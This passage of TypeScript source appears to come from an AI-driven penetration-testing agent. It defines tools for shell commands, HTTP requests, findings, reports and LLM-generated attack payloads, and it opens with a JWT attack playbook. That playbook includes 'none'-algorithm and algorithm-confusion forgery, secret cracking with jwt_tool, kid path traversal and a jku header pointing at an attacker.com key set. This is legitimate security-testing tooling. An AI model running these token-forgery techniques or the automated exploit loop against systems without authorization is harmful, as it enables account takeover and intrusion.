        "Modified payload accepted without signature verification",
        "Algorithm confusion successful (RS256→HS256 works)",
        "Weak secret cracked within minutes",
        "Token forgery grants unauthorized access",
        "User ID manipulation successful (user 1 → user 2)",
        "Role/privilege escalation via token modification (user → admin)",
        "Kid parameter accepts path traversal",
        "jku/x5u header injection successful"
      ],
      notVulnerable: [
        "Signature verification enforced",
        "Algorithm whitelist in place (only HS256 or only RS256)",
        "'none' algorithm rejected",
        "Strong secret (64+ random characters)",
        "Token modifications rejected",
        "Proper library usage with verification",
        "Kid parameter validated/whitelisted",
        "Header parameter injection blocked"
      ]
    },

    adaptiveStrategy: `
Round 1: Basic Manipulation
- Decode JWT and identify user_id, role, privileges in payload
- TEST 1: Modify user_id (1→2) and send with same signature
- TEST 2: Modify role (user→admin) and send with same signature
- Check if application accepts modified token without verification

Round 2: Algorithm Attacks
- TEST 1: Change alg to 'none', remove signature entirely
- Format: header.payload. (note the trailing dot)
- TEST 2: Try algorithm confusion if token uses RS256
- Change alg header to HS256, sign with public key

Round 3: Secret Attacks & Advanced
- TEST 1: Try common secrets with jwt_tool
- jwt_tool <token> -C -d /path/to/common-secrets.txt
- TEST 2: If kid parameter exists, try path traversal
- {\"kid\": \"../../../../dev/null\"}
- TEST 3: Try jku header injection
- {\"jku\": \"http://attacker.com/jwks.json\"}

CRITICAL: JWT tokens often in:
- Authorization: Bearer <token> header
- Cookies (jwt=, auth=, session=)
- X-Auth-Token or X-Access-Token headers

Check ALL locations where tokens might be stored/transmitted!
    `
  }
} as const;

// Exported type definitions for tool overrides
export const ExecuteCommandInput = z.object({
  command: z.string().describe("The shell command to execute"),
  timeout: z
    .number()
    .optional()
    .describe("Timeout in milliseconds (default: 30000)"),
  toolCallDescription: z
    .string()
    .describe("Concise description of this tool call"),
});

export type ExecuteCommandOpts = z.infer<typeof ExecuteCommandInput>;
export type ExecuteCommandResult = {
  success: boolean;
  error: string;
  stdout: string;
  stderr: string;
  command: string;
};

export const HttpRequestInput = z.object({
  url: z.string().describe("The URL to request"),
  method: z
    .enum(["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"])
    .default("GET"),
  headers: z
    .preprocess((val) => {
      if (typeof val === "string") {
        try {
          return JSON.parse(val);
        } catch {
          return {}; // Return empty object if parsing fails
        }
      }
      return val;
    }, z.record(z.string(), z.string()).optional())
    .describe("HTTP headers as key-value pairs (object or JSON string)"),
  body: z.string().optional().describe("Request body (for POST, PUT, PATCH)"),
  followRedirects: z.boolean().default(true),
  timeout: z.number().default(10000),
  toolCallDescription: z
    .string()
    .describe("Concise description of this tool call"),
});

export type HttpRequestOpts = z.infer<typeof HttpRequestInput>;

export type HttpRequestResult = {
  success: boolean;
  status: number;
  statusText: string;
  headers: Record<string, string>;
  body: string;
  url: string;
  redirected: boolean;
};


/**
 * Analysis tool - Document findings and maintain testing state
 *
 * This function is created with a session context to save findings to disk
 */
function createDocumentFindingTool(session: Session) {
  return tool({
    name: "document_finding",
    description: `Document a security finding with severity, impact, and remediation guidance.

SEVERITY LEVELS:
- CRITICAL: Immediate risk of system compromise (RCE, auth bypass, SQL injection with data access)
- HIGH: Significant security risk (XSS, CSRF, sensitive data exposure, privilege escalation)
- MEDIUM: Security weakness that could be exploited (information disclosure, weak configs)
- LOW: Minor security concern (missing headers, verbose errors)

FINDING STRUCTURE:
- Title: Clear, concise description
- Severity: Use CVSS if applicable
- Description: Detailed technical explanation
- Impact: Business and technical consequences
- Evidence: Commands run, responses received, proof of vulnerability
- Remediation: Specific, actionable steps to fix
- References: CVE, CWE, OWASP, or security advisories`,
    inputSchema: z.object({
      title: z.string().describe("Finding title"),
      severity: z.enum(["CRITICAL", "HIGH", "MEDIUM", "LOW"]),
      description: z.string().describe("Detailed description of the finding"),
      impact: z.string().describe("Potential impact if exploited"),
      evidence: z.string().describe("Evidence/proof of the vulnerability"),
      remediation: z.string().describe("Steps to fix the issue"),
      references: z
        .string()
        .optional()
        .describe("CVE, CWE, or related references"),
      toolCallDescription: z
        .string()
        .describe("Concise description of this tool call"),
    }),
    execute: async (finding) => {
      try {
        const timestamp = new Date().toISOString();
        const findingWithMeta = {
          ...finding,
          timestamp,
          sessionId: session.id,
          target: session.target,
        };

        // Create a safe filename from the title
        const safeTitle = finding.title
          .toLowerCase()
          .replace(/[^a-z0-9]+/g, "-")
          .replace(/^-|-$/g, "")
          .substring(0, 50);

        const findingId = `${timestamp.split("T")[0]}-${safeTitle}`;
        const filename = `${findingId}.md`;
        const filepath = join(session.findingsPath, filename);

        // Create markdown document
        const markdown = `# ${finding.title}

**Severity:** ${finding.severity}  
**Target:** ${session.target}  
**Date:** ${timestamp}  
**Session:** ${session.id}

## Description

${finding.description}

## Impact

${finding.impact}

## Evidence

\`\`\`
${finding.evidence}
\`\`\`

## Remediation

${finding.remediation}

${finding.references ? `## References\n\n${finding.references}` : ""}

---

*This finding was automatically documented by the Pensar penetration testing agent.*
`;

        writeFileSync(filepath, markdown);

        // Also append to a summary file
        const summaryPath = join(session.rootPath, "findings-summary.md");
        const summaryEntry = `- [${finding.severity}] ${finding.title} - \`findings/${filename}\`\n`;

        try {
          appendFileSync(summaryPath, summaryEntry);
        } catch (e) {
          // File doesn't exist, create it with header
          const header = `# Findings Summary\n\n**Target:** ${session.target}  \n**Session:** ${session.id}\n\n## All Findings\n\n`;
          writeFileSync(summaryPath, header + summaryEntry);
        }

        return {
          success: true,
          finding: findingWithMeta,
          filepath,
          message: `Finding documented: [${finding.severity}] ${finding.title}`,
        };
      } catch (error: any) {
        return {
          success: false,
          error: error.message,
          message: `Failed to document finding: ${error.message}`,
        };
      }
    },
  });
}

/**
 * Scratchpad tool - Take notes during testing
 */
function createScratchpadTool(session: Session) {
  return tool({
    name: "scratchpad",
    description: `Write notes, observations, or temporary data to the scratchpad during testing.

Use this to:
- Keep track of interesting findings that need more investigation
- Note patterns or anomalies
- Store intermediate results
- Track your testing progress
- Document hypotheses

The scratchpad is session-specific and helps maintain context during long assessments.`,
    inputSchema: z.object({
      note: z.string().describe("The note or observation to record"),
      category: z
        .enum(["observation", "todo", "hypothesis", "result", "general"])
        .default("general"),
      toolCallDescription: z
        .string()
        .describe("Concise description of this tool call"),
    }),
    execute: async ({ note, category }) => {
      try {
        const timestamp = new Date().toISOString();
        const scratchpadFile = join(session.scratchpadPath, "notes.md");

        const entry = `## ${category.toUpperCase()} - ${timestamp}\n\n${note}\n\n---\n\n`;

        try {
          appendFileSync(scratchpadFile, entry);
        } catch (e) {
          // File doesn't exist, create it with header
          const header = `# Scratchpad - Session ${session.id}\n\n**Target:** ${session.target}  \n**Objective:** ${session.objective}\n\n---\n\n`;
          writeFileSync(scratchpadFile, header + entry);
        }

        return {
          success: true,
          message: "Note added to scratchpad",
          timestamp,
        };
      } catch (error: any) {
        return {
          success: false,
          error: error.message,
        };
      }
    },
  });
}

/**
 * Port scan analyzer - Interpret nmap results
 */
export const analyzeScan = tool({
  name: "analyze_scan",
  description: `Analyze scan results and suggest next steps for penetration testing.

This tool helps interpret findings from:
- Port scans (nmap, masscan)
- Service enumeration
- Web server scans (nikto, dirb)
- SSL/TLS scans
- Subdomain enumeration

Provides guidance on:
- Which services to investigate further
- Known vulnerabilities for detected versions
- Common misconfigurations to test
- Recommended testing tools and techniques
- Attack surface prioritization`,
  inputSchema: z.object({
    scanType: z.enum([
      "port_scan",
      "service_enum",
      "web_scan",
      "ssl_scan",
      "other",
    ]),
    results: z.string().describe("The scan results to analyze"),
    target: z.string().describe("The target that was scanned"),
  }),
  execute: async ({ scanType, results, target }) => {
    // Parse and provide intelligent analysis
    const analysis = {
      scanType,
      target,
      timestamp: new Date().toISOString(),
      summary: "",
      openPorts: [] as string[],
      services: [] as string[],
      recommendations: [] as string[],
      potentialVulnerabilities: [] as string[],
    };

    // Simple parsing logic (can be enhanced)
    if (scanType === "port_scan") {
      const portMatches = results.match(/(\d+)\/tcp\s+open/g);
      if (portMatches) {
        analysis.openPorts = portMatches
          .map((m) => m.split("/")[0])
          .filter((p): p is string => p !== undefined);
        analysis.summary = `Found ${analysis.openPorts.length} open TCP ports`;

        // Add recommendations based on common ports
        if (
          analysis.openPorts.includes("80") ||
          analysis.openPorts.includes("443")
        ) {
          analysis.recommendations.push(
            "Run web application scans (nikto, gobuster)"
          );
        }
        if (analysis.openPorts.includes("22")) {
          analysis.recommendations.push(
            "Test SSH authentication methods and banners"
          );
        }
        if (
          analysis.openPorts.includes("3306") ||
          analysis.openPorts.includes("5432")
        ) {
          analysis.recommendations.push(
            "Database port exposed - test for default credentials"
          );
        }
      }
    }

    return {
      success: true,
      analysis,
      nextSteps: analysis.recommendations,
    };
  },
});

/**
 * Generate comprehensive report - Create final pentest report
 */
function createGenerateReportTool(session: Session) {
  return tool({
    name: "generate_report",
    description: `Generate a comprehensive penetration testing report for the session.

This tool creates a detailed report including:
- Executive summary with key findings
- Test scope and objectives
- Methodology used
- Detailed findings organized by severity
- Statistics and metrics
- Recommendations and remediation guidance
- Testing timeline and activities

Use this tool when:
- The penetration test is complete
- You want to generate a final deliverable
- You need to summarize all findings and activities

The report will be saved as 'pentest-report.md' in the session root directory.`,
    inputSchema: z.object({
      executiveSummary: z
        .string()
        .describe("High-level summary of the assessment for executives"),
      methodology: z
        .string()
        .describe("Description of the testing methodology and approach used"),
      scopeDetails: z
        .string()
        .optional()
        .describe("Additional details about the scope and limitations"),
      keyFindings: z
        .array(z.string())
        .describe("List of the most critical findings"),
      recommendations: z
        .string()
        .describe("Overall recommendations and next steps"),
      testingActivities: z
        .string()
        .optional()
        .describe("Summary of testing activities performed"),
      toolCallDescription: z
        .string()
        .describe("Concise description of this tool call"),
    }),
    execute: async ({
      executiveSummary,
      methodology,
      scopeDetails,
      keyFindings,
      recommendations,
      testingActivities,
    }) => {
      try {
        const endTime = new Date().toISOString();
        const startDate = new Date(session.startTime);
        const endDate = new Date(endTime);
        const duration = Math.round(
          (endDate.getTime() - startDate.getTime()) / (1000 * 60)
        ); // minutes

        // Read all findings from the findings directory
        const findings: any[] = [];
        const severityCounts = {
          CRITICAL: 0,
          HIGH: 0,
          MEDIUM: 0,
          LOW: 0,
        };

        if (existsSync(session.findingsPath)) {
          const findingFiles = readdirSync(session.findingsPath).filter((f) =>
            f.endsWith(".json")
          );

          for (const file of findingFiles) {
            const filePath = join(session.findingsPath, file);
            const content = readFileSync(filePath, "utf-8");

            // Extract severity from the markdown
            const severityMatch = content.match(
              /\*\*Severity:\*\*\s+(CRITICAL|HIGH|MEDIUM|LOW)/
            );
            const titleMatch = content.match(/^#\s+(.+)$/m);

            if (severityMatch && titleMatch) {
              const severity = severityMatch[1] as keyof typeof severityCounts;
              severityCounts[severity]++;
              findings.push({
                title: titleMatch[1],
                severity,
                file,
                content,
              });
            }
          }
        }

        // Sort findings by severity
        const severityOrder = {
          CRITICAL: 0,
          HIGH: 1,
          MEDIUM: 2,
          LOW: 3,
        };
        findings.sort(
          (a, b) =>
            severityOrder[a.severity as keyof typeof severityOrder] -
            severityOrder[b.severity as keyof typeof severityOrder]
        );

        const totalFindings = findings.length;
        const criticalAndHigh = severityCounts.CRITICAL + severityCounts.HIGH;

        // Read scratchpad notes if they exist
        let scratchpadNotes = "";
        const scratchpadFile = join(session.scratchpadPath, "notes.md");
        if (existsSync(scratchpadFile)) {
          scratchpadNotes = readFileSync(scratchpadFile, "utf-8");
        }

        // Read test results if they exist
        let testResultsSummary = "";
        const testResultsFile = join(session.scratchpadPath, "test-results.jsonl");
        if (existsSync(testResultsFile)) {
          const testLines = readFileSync(testResultsFile, "utf-8").split("\n").filter(l => l.trim());
          const testResults = testLines.map(line => {
            try {
              return JSON.parse(line);
            } catch {
              return null;
            }
          }).filter(Boolean);

          const totalTests = testResults.length;
          const vulnerableTests = testResults.filter(t => t.vulnerable).length;
          const notVulnerableTests = totalTests - vulnerableTests;

          // Group by attack type
          const byAttackType: Record<string, { total: number; vulnerable: number }> = {};
          testResults.forEach(test => {
            if (!byAttackType[test.attackType]) {
              byAttackType[test.attackType] = { total: 0, vulnerable: 0 };
            }
            byAttackType[test.attackType]!.total++;
            if (test.vulnerable) byAttackType[test.attackType]!.vulnerable++;
          });

          testResultsSummary = `
**Test Coverage Statistics:**
- **Total Tests Performed:** ${totalTests}
- **Vulnerabilities Found:** ${vulnerableTests}
- **Parameters Tested (Not Vulnerable):** ${notVulnerableTests}

**Attack Type Coverage:**
${Object.entries(byAttackType).map(([type, stats]) =>
  `- ${type}: ${stats.total} test${stats.total > 1 ? 's' : ''} (${stats.vulnerable} vulnerable)`
).join('\n')}

This demonstrates systematic testing methodology and proves thoroughness beyond just vulnerability discovery.`;
        }

        // Generate the comprehensive report
        const report = `# Penetration Testing Report

**Target:** ${session.target}  
**Session ID:** ${session.id}  
**Test Period:** ${new Date(
          session.startTime
        ).toLocaleString()} - ${endDate.toLocaleString()}  
**Duration:** ${duration} minutes  
**Report Generated:** ${endTime}

---

## Executive Summary

${executiveSummary}

### Key Statistics

- **Total Findings:** ${totalFindings}
- **Critical:** ${severityCounts.CRITICAL}
- **High:** ${severityCounts.HIGH}
- **Medium:** ${severityCounts.MEDIUM}
- **Low:** ${severityCounts.LOW}

### Risk Level

${
  criticalAndHigh > 0
    ? `⚠️ **HIGH RISK** - ${criticalAndHigh} critical or high severity findings require immediate attention.`
    : severityCounts.MEDIUM > 0
    ? `⚠️ **MEDIUM RISK** - ${severityCounts.MEDIUM} medium severity findings should be addressed.`
    : `✓ **LOW RISK** - No critical or high severity findings identified.`
}

---

## Scope and Objectives

**Target:** ${session.target}  
**Objective:** ${session.objective}

${scopeDetails ? `\n${scopeDetails}\n` : ""}

---

## Methodology

${methodology}

${testingActivities ? `\n### Testing Activities\n\n${testingActivities}\n` : ""}

${testResultsSummary ? `\n### Test Coverage\n\n${testResultsSummary}\n` : ""}

---

## Key Findings

${keyFindings.map((finding, idx) => `${idx + 1}. ${finding}`).join("\n")}

---

## Detailed Findings

${
  totalFindings === 0
    ? "No security findings were documented during this assessment."
    : findings
        .map(
          (finding, idx) => `
### ${idx + 1}. [${finding.severity}] ${finding.title}

**Reference:** \`findings/${finding.file}\`

${
  finding.content.split("## Description")[1]?.split("---")[0]?.trim() ||
  "See detailed finding document for full information."
}

`
        )
        .join("\n")
}

---

## Recommendations

${recommendations}

### Priority Actions

${
  severityCounts.CRITICAL > 0
    ? `
**Critical Priority:**
- Address all ${severityCounts.CRITICAL} critical findings immediately
- These vulnerabilities pose an immediate risk to system security
`
    : ""
}

${
  severityCounts.HIGH > 0
    ? `
**High Priority:**
- Remediate ${severityCounts.HIGH} high severity findings within 30 days
- These issues significantly increase attack surface
`
    : ""
}

${
  severityCounts.MEDIUM > 0
    ? `
**Medium Priority:**
- Plan remediation for ${severityCounts.MEDIUM} medium severity findings within 90 days
- These weaknesses should be addressed in the next security cycle
`
    : ""
}

---

## Appendices

### Appendix A: Findings Summary

${findings
  .map((f) => `- [${f.severity}] ${f.title} - \`findings/${f.file}\``)
  .join("\n")}

### Appendix B: Session Information

- **Session Directory:** \`${session.rootPath}\`
- **Findings Directory:** \`findings/\`
- **Scratchpad:** \`scratchpad/\`
- **Logs:** \`logs/\`

${
  scratchpadNotes
    ? `\n### Appendix C: Testing Notes\n\nExtracted from scratchpad:\n\n${scratchpadNotes.substring(
        0,
        5000
      )}${
        scratchpadNotes.length > 5000
          ? "\n\n[Truncated - see scratchpad/notes.md for full notes]"
          : ""
      }\n`
    : ""
}

---

## Disclaimer

This penetration testing report is provided for informational purposes only. The findings documented herein are based on the testing performed during the specified timeframe and scope. Security vulnerabilities not identified in this report may still exist. 

This report should be treated as confidential and distributed only to authorized personnel.

---

*Report generated by Pensar Penetration Testing Agent*  
*Session: ${session.id}*
`;

        // Save the report
        const reportPath = join(session.rootPath, "pentest-report.md");
        writeFileSync(reportPath, report);

        // Update the session README to mark completion
        const readmePath = join(session.rootPath, "README.md");
        if (existsSync(readmePath)) {
          let readme = readFileSync(readmePath, "utf-8");
          readme = readme.replace(
            "Testing in progress...",
            `Testing completed on ${endDate.toLocaleString()}\n\n**Final Report:** \`pentest-report.md\``
          );
          writeFileSync(readmePath, readme);
        }

        // Update session metadata
        const metadataPath = join(session.rootPath, "session.json");
        if (existsSync(metadataPath)) {
          const metadata = JSON.parse(readFileSync(metadataPath, "utf-8"));
          metadata.endTime = endTime;
          metadata.duration = duration;
          metadata.status = "completed";
          metadata.totalFindings = totalFindings;
          metadata.severityCounts = severityCounts;
          writeFileSync(metadataPath, JSON.stringify(metadata, null, 2));
        }

        return {
          success: true,
          reportPath,
          statistics: {
            totalFindings,
            severityCounts,
            duration,
            criticalAndHigh,
          },
          message: `Comprehensive report generated successfully at ${reportPath}`,
        };
      } catch (error: any) {
        return {
          success: false,
          error: error.message,
          message: `Failed to generate report: ${error.message}`,
        };
      }
    },
  });
}

/**
 * Core logic for recording test results 
 */
async function recordTestResultCore(session: Session, params: {
  parameter: string;
  endpoint: string;
  attackType: string;
  vulnerable: boolean;
  payloadsTested: Array<{payload: string; description: string; result: string}>;
  conclusion: string;
  evidence?: string;
  confidence?: 'high' | 'medium' | 'low';
}) {
  try {
    const timestamp = new Date().toISOString();
    const testId = `test-${Date.now()}-${params.attackType}-${params.parameter}`;

    const testResult = {
      id: testId,
      timestamp,
      sessionId: session.id,
      parameter: params.parameter,
      endpoint: params.endpoint,
      attackType: params.attackType,
      vulnerable: params.vulnerable,
      payloadsTested: params.payloadsTested,
      totalPayloadsTested: params.payloadsTested.length,
      conclusion: params.conclusion,
      evidence: params.evidence || '',
      confidence: params.confidence || 'high',
    };

    // Save to scratchpad as test-results-{type}.json
    const testResultsPath = join(session.scratchpadPath, 'test-results.jsonl');
    const resultLine = JSON.stringify(testResult) + '\n';

    appendFileSync(testResultsPath, resultLine);

    return {
      success: true,
      testId,
      message: params.vulnerable
        ? `✓ Test recorded: VULNERABLE to ${params.attackType} (${params.payloadsTested.length} payloads tested)`
        : `✓ Test recorded: NOT vulnerable to ${params.attackType} (${params.payloadsTested.length} payloads tested)`,
      recommendation: params.vulnerable
        ? 'Use document_finding to create a formal vulnerability report'
        : 'Continue testing other attack types or parameters',
    };
  } catch (error: any) {
    return {
      success: false,
      error: error.message,
      message: `Failed to record test result: ${error.message}`,
    };
  }
}

/**
 * Record test result - Track all security tests including negative results
 */
function createRecordTestResultTool(session: Session) {
  return tool({
    name: "record_test_result",
    description: `Record the result of a security test, including tests that did NOT find vulnerabilities.

This tool is critical for:
- Documenting thorough testing methodology
- Proving which attack vectors were attempted
- Tracking negative results (tested but not vulnerable)
- Building coverage metrics

WHEN TO USE:
- After testing ANY parameter for a specific vulnerability type
- Whether you found a vulnerability or not
- To document what payloads were tested

IMPORTANT: This is separate from document_finding. Use this for ALL tests, use document_finding only for confirmed vulnerabilities.

Example workflow:
1. Test 'username' parameter for SQL injection with 5 payloads
2. No vulnerability found
3. Call record_test_result to document the test
4. Result: You've proven the parameter is safe from SQL injection`,
    inputSchema: z.object({
      parameter: z.string().describe("The parameter name that was tested"),
      endpoint: z.string().describe("The endpoint/URL where the parameter exists"),
      attackType: z.enum([
        'sql_injection',
        'nosql_injection',
        'graphql_injection',
        'xss_reflected',
        'xss_stored',
        'xss_dom',
        'command_injection',
        'xxe',
        'ssrf',
        'idor',
        'csrf',
        'lfi',
        'rfi',
        'ssti',
        'path_traversal',
        'authentication_bypass',
        'authorization_bypass',
        'business_logic',
        'information_disclosure',
        'rate_limiting',
        'session_management',
      ]).describe("The type of attack tested"),
      vulnerable: z.boolean().describe("Whether a vulnerability was found"),
      payloadsTested: z.array(z.object({
        payload: z.string(),
        description: z.string(),
        result: z.string(),
      })).describe("List of payloads tested and their results"),
      conclusion: z.string().describe("Overall conclusion of the test"),
      evidence: z.string().optional().describe("Evidence if vulnerability found"),
      confidence: z.enum(['high', 'medium', 'low']).optional().describe("Confidence level if vulnerable"),
      toolCallDescription: z.string(),
    }),
    execute: async (params) => recordTestResultCore(session, params),
  });
}

/**
 * AI Helper Functions for Smart Testing
 */

// Generate AI-powered test strategy
async function generateTestStrategy(params: {
  attackType: string;
  knowledge: any;
  parameter: string;
  endpoint: string;
  context?: any;
}, model: AIModel) {
  const prompt = `You are a penetration testing expert. Generate a concise testing strategy:

Attack Type: ${params.knowledge.name}
Description: ${params.knowledge.description}
Objective: ${params.knowledge.objective}

Techniques available:
${params.knowledge.techniques.map((t: any) => `- ${t.name}: ${t.how}`).join('\n')}

Target: ${params.endpoint} parameter "${params.parameter}"
Context: ${JSON.stringify(params.context || {})}

Generate a 2-3 sentence testing strategy:
1. Which technique to try first and why
2. What to look for in responses
3. How to adapt if first attempt fails

Be tactical and specific.`;

  try {
    const providerModel = getProviderModel(model);

    const result = await generateText({
      model: providerModel,
      prompt,
    });

    return result.text;
  } catch (error) {
    // Fallback to knowledge base strategy
    return params.knowledge.adaptiveStrategy;
  }
}

// Generate contextual payload using AI
async function generatePayload(params: {
  attackType: string;
  knowledge: any;
  context: any;
  previousResults: any[];
  round: number;
}, model: AIModel) {
  const prompt = `Generate ONE ${params.knowledge.name} payload for testing.

Techniques:
${params.knowledge.techniques.map((t: any) => `- ${t.name}: ${t.example}`).join('\n')}

${params.previousResults.length > 0 ? `
Previous attempts:
${params.previousResults.map((r: any) => `- ${r.payload}: ${r.result} (vulnerable: ${r.vulnerable})`).join('\n')}
` : ''}

Round ${params.round + 1}/3:
- Round 1: Detection/reconnaissance
- Round 2: Exploitation
- Round 3: Alternative approach

Generate ONE specific payload. Return ONLY JSON:
{"payload": "exact payload string", "reasoning": "why this payload in 1 sentence", "technique": "technique name"}`;

  try {
    const result = await generateObjectResponse({
      model,
      schema: PayloadSchema,
      prompt,
    });

    return result;
  } catch (error) {
    console.error('AI payload generation failed:', error);
  }

  // Fallback: Use first technique example
  const technique = params.knowledge.techniques[params.round % params.knowledge.techniques.length];
  return {
    payload: technique.example.split("'")[1] || technique.example,
    reasoning: `Using ${technique.name} technique`,
    technique: technique.name
  };
}

// Analyze response with AI
async function analyzeResponse(params: {
  response: any;
  payload: any;
  attackType: string;
  knowledge: any;
  previousResults: any[];
}, model: AIModel) {
  const prompt = `Analyze this security test response:

Attack: ${params.knowledge.name}
Payload: ${params.payload.payload}
HTTP Status: ${params.response.status}
Response Body: ${params.response.body?.substring(0, 500) || 'N/A'}

Vulnerable indicators:
${params.knowledge.indicators.vulnerable.map((i: string) => `- ${i}`).join('\n')}

Secure indicators:
${params.knowledge.indicators.notVulnerable.map((i: string) => `- ${i}`).join('\n')}

Analyze: Is this vulnerable? Return ONLY JSON:
{
  "vulnerable": true/false,
  "confidence": "high"/"medium"/"low",
  "reasoning": "1-2 sentence explanation",
  "certainlyNotVulnerable": true/false,
  "suggestedNextTest": "what to try next if uncertain"
}`;

  try {
    const result = await generateObjectResponse({
      model,
      schema: AnalysisSchema,
      prompt,
    });

    return result;
  } catch (error) {
    console.error('AI analysis failed:', error);
  }

  // Fallback: Simple heuristic detection
  const responseStr = JSON.stringify(params.response).toLowerCase();
  const vulnerableIndicators = params.knowledge.indicators.vulnerable;
  const notVulnerableIndicators = params.knowledge.indicators.notVulnerable;

  const foundVulnIndicator = vulnerableIndicators.some((indicator: string) =>
    responseStr.includes(indicator.toLowerCase().substring(0, 20))
  );

  const foundSecureIndicator = notVulnerableIndicators.some((indicator: string) =>
    responseStr.includes(indicator.toLowerCase().substring(0, 20))
  );

  return {
    vulnerable: foundVulnIndicator && !foundSecureIndicator,
    confidence: foundVulnIndicator ? 'medium' : 'low',
    reasoning: foundVulnIndicator
      ? 'Response contains vulnerability indicators'
      : foundSecureIndicator
        ? 'Response shows secure implementation'
        : 'Inconclusive - no clear indicators',
    certainlyNotVulnerable: foundSecureIndicator,
    suggestedNextTest: 'Try alternative payload or technique'
  };
}

/**
 * Smart Test Parameter Tool
 */
function createSmartTestTool(session: Session, model: AIModel) {
  return tool({
    name: "test_parameter",
    description: `Intelligently test a parameter for a vulnerability using AI-powered adaptive testing.

This tool uses AI to:
1. Generate contextual payloads based on attack knowledge and previous attempts
2. Analyze responses intelligently to detect vulnerabilities
3. Adapt testing strategy based on what it learns (up to 3 rounds)
4. Automatically record all results for coverage tracking

WHEN TO USE:
- When you want to test a specific parameter for a specific vulnerability
- After discovering new parameters or endpoints
- When the objective mentions a specific attack type you haven't tested
- To prove you tested something (records negative results too)

The tool handles payload generation, testing, detection, and recording automatically.

Example:
test_parameter({
  parameter: "prescriptionDetails",
  endpoint: "/graphql",
  attackType: "graphql_injection",
  context: {techStack: "GraphQL", observations: "Has introspection enabled"}
})`,

    inputSchema: z.object({
      parameter: z.string().describe("Parameter name to test"),
      endpoint: z.string().describe("Endpoint URL where parameter exists"),
      attackType: z.enum([
        'sql_injection', 'nosql_injection', 'graphql_injection',
        'xss_reflected', 'xss_stored', 'command_injection',
        'idor', 'business_logic'
      ]).describe("Type of attack to test"),
      context: z.object({
        parameterType: z.string().optional(),
        method: z.string().optional(),
        techStack: z.string().optional(),
        observations: z.string().optional()
      }).optional().describe("Additional context about the target"),
      toolCallDescription: z.string()
    }),

    execute: async ({parameter, endpoint, attackType, context}) => {
      try {
        // Get attack knowledge
        const knowledge = ATTACK_KNOWLEDGE[attackType as keyof typeof ATTACK_KNOWLEDGE];
        if (!knowledge) {
          return {
            success: false,
            message: `Unknown attack type: ${attackType}`,
          };
        }

        if ('systematic_discovery' in knowledge) {
          return {
            success: false,
            message: `methodology is not a testable attack type - use specific attack types like sql_injection, xss_reflected, etc.`,
          };
        }

        console.log(`\n[*] Testing ${parameter} for ${knowledge.name}...`);

        // Generate strategy (optional, for logging)
        const strategy = await generateTestStrategy({
          attackType,
          knowledge,
          parameter,
          endpoint,
          context
        }, model);

        console.log(`Strategy: ${strategy}`);

        // Adaptive testing loop (up to 3 rounds)
        const results = [];
        let vulnerable = false;
        let finalConfidence = 'low';

        for (let round = 0; round < 3 && !vulnerable; round++) {
          console.log(`  Round ${round + 1}/3...`);

          // AI generates payload
          const payloadData = await generatePayload({
            attackType,
            knowledge,
            context: {...context, parameter, endpoint},
            previousResults: results,
            round
          }, model);

          console.log(`  Payload: ${payloadData.payload}`);
          console.log(`  Reasoning: ${payloadData.reasoning}`);

          // Execute test
          let response;
          try {
            response = await fetch(endpoint, {
              method: context?.method || 'POST',
              headers: {'Content-Type': 'application/json'},
              body: JSON.stringify({[parameter]: payloadData.payload})
            });

            const body = await response.text();
            response = {
              status: response.status,
              body: body.substring(0, 1000), // Limit for analysis
              headers: Object.fromEntries(response.headers.entries())
            };
          } catch (error: any) {
            response = {
              status: 0,
              body: error.message,
              headers: {}
            };
          }

          // AI analyzes response
          const analysis = await analyzeResponse({
            response,
            payload: payloadData,
            attackType,
            knowledge,
            previousResults: results
          }, model);

          console.log(`  Analysis: ${analysis.reasoning}`);
          console.log(`  Vulnerable: ${analysis.vulnerable} (confidence: ${analysis.confidence})`);

          results.push({
            payload: payloadData.payload,
            description: payloadData.reasoning,
            result: `HTTP ${response.status}: ${analysis.reasoning}`,
            vulnerable: analysis.vulnerable,
            confidence: analysis.confidence
          });

          vulnerable = analysis.vulnerable;
          finalConfidence = analysis.confidence;

          // Stop if high confidence or certainly not vulnerable
          if ((vulnerable && analysis.confidence === 'high') || analysis.certainlyNotVulnerable) {
            console.log(`  Stopping early: ${analysis.certainlyNotVulnerable ? 'Certainly not vulnerable' : 'High confidence vulnerability found'}`);
            break;
          }
        }

        // Record test result
        const recordTool = createRecordTestResultTool(session);
        await recordTool.execute!({
          parameter,
          endpoint,
          attackType,
          vulnerable,
          payloadsTested: results,
          conclusion: vulnerable
            ? `VULNERABLE to ${knowledge.name} with ${finalConfidence} confidence`
            : `NOT VULNERABLE to ${knowledge.name} after ${results.length} tests`,
          evidence: vulnerable ? JSON.stringify(results.filter(r => r.vulnerable)) : undefined,
          confidence: finalConfidence as any,
          toolCallDescription: 'Recording test result'
        }, {} as any);

        return {
          success: true,
          vulnerable,
          confidence: finalConfidence,
          testsPerformed: results.length,
          results,
          recommendation: vulnerable
            ? `✓ VULNERABILITY FOUND! Use document_finding to formally document this ${knowledge.name} vulnerability.`
            : `✓ Parameter appears secure against ${knowledge.name}. Continue testing other attack types or parameters.`,
          nextAction: vulnerable ? 'document_finding' : 'continue_testing'
        };

      } catch (error: any) {
        return {
          success: false,
          error: error.message,
          message: `Test failed: ${error.message}`
        };
      }
    }
  });
}

function getAttackSurfaceAgent() {
  return tool({
    name: "get_attack_surface",
    description:
      "Get the attack surface of a target using the attack surface agent",
    inputSchema: z.object({
      target: z.string().describe("The target to get the attack surface of"),
    }),
    execute: async ({ target }) => {},
  });
}

function runPentestAgents(model: AIModel = "claude-4-sonnet-20240229") {
  return tool({
    name: "pentest_agents",
    description: "Perform a pentest on a target using the pentest agent",
    inputSchema: z.object({
      targets: z
        .array(
          z.object({
            target: z.string().describe("The target to perform a pentest on"),
            objective: z.string().describe("The objective of the pentest"),
          })
        )
        .describe("The targets to perform a pentest on"),
    }),
    execute: async ({ targets }) => {
      const promises = targets.map((target) => {
        return runAgent({
          target: target.target,
          objective: target.objective,
          model: model,
        });
      });
      const results = await Promise.all(promises);
      return results;
    },
  });
}

function createCheckTestingCoverageTool(session: Session) {
  return tool({
    name: "check_testing_coverage",
    description: `Analyze testing coverage to understand what has been tested and identify gaps.

This tool reads all recorded test results and provides:
- List of parameters tested and attack types covered
- Summary statistics (total tests, vulnerable vs safe, coverage by attack type)
- Identified gaps in testing (untested parameters, untested attack types)
- Suggestions for next tests based on objective and current coverage

Use this when:
- You want to understand what you've already tested
- You need to identify gaps before final report
- You want suggestions on what to test next
- You're unsure if you've tested thoroughly enough`,

    inputSchema: z.object({
